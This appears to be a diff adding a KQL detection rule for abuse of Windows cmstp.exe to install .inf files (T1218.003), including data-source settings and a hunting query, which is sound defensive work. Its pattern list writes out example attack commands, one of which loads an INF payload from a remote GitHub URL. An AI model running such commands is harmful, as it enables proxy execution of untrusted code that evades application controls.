@@ -1,0 +1,39 @@
+---
+title: cmstp_pid_0001_executing_inf_file
+intel:
+  description:
+    - installs a specially formatted .inf
+  detectType: single_line_match
+  detectCon: 2
+  detectLanguage: kql
+  tags:
+    - lolbin
+  attackTechnique: t1218.003
+  attackSoftware:
+  references:
+  emulation:
+    - atomic_red_team_t1218_003_t1_guid_34e63321-9683-496b-bbc1-7566bc55e624
+    - atomic_red_team_t1218_003_t2_guid_748cb4f6-2fb3-4e97-b7ad-b22635a09ab0
+  pattern:
+    - cmstp.exe /s path\to\some_file.inf /au
+    - cmstp.exe /s path\to\some_file.inf
+    - cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
+    - cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf
+dataRequirements:
+  dataSource: windows_os
+  dataType: process_creation
+  dataCollector: m365d_agent
+  dataForwardTo: m365d_security_center
+  dataParser:
+  dataStorage: m365d_security_center
+  dataTable: device_process_events
+  dataIndex:
+  dataAccess: api_advanced_hunting
+  dataMap:
+logic:
+  kqlVar:
+  kqlTable: DeviceProcessEvents
+  kqlQuery: | 
+    | where ProcessCommandLine has 'cmstp'
+      or ProcessVersionInfoOriginalFileName has 'cmstp'
+    | where ProcessCommandLine contains '.inf'
